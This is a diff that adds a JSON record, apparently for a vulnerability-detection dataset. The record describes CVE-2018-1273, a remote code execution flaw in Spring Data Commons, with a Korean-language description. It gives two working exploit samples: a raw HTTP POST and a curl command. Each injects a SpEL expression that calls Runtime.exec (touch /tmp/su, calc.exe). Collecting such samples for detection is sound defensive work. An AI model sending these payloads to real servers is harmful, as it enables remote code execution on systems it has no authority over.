@@ -1,0 +1,9 @@
+{
+        "Name": "Pivotal Spring Spring Data Commons RCE",
+        "Description": "-웹 애플리케이션을 구축할 때 널리 사용되는 플랫폼\n-특수 요소를 부적절하게 중립화하는 속성 바인더 취약점 존재\n-MapDataBinder 클래스가 사용자가 제어 할 수있는 Spring Expression Language(SpEL) Expression을 부적절하게 구문 분석하고 평가 하는데서 발생\n-취약점을 이용해 공격자가 특수 T () 연산자가 포함 된 문자열을 보낼 수 있음\n- Spring Data REST 지원 HTTP 리소스에 대해 특수하게 조작 된 요청 매개 변수를 제공하거나 Spring Data의 프로젝션 기반 요청 페이로드 바인딩캡를 사용하면 원격 코드 실행 공격이 가능",
+        "References": ["CVE-2018-1273"],
+        "Samples": ["POST /users?page=&size=5 HTTP/1.1\nHost: 211.214.199.27:8080\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\nContent-Length: 119\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip\n\nusername[#this.getClass().forName(java.lang.Runtime).getRuntime().exec(touch /tmp/su)]=&password=&repeatedPassword=","curl -X POST http://localhost:8080/account -d name[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('calc.exe')]=123"],
+        "Keywords": [],
+        "Signature":[]
+}
+
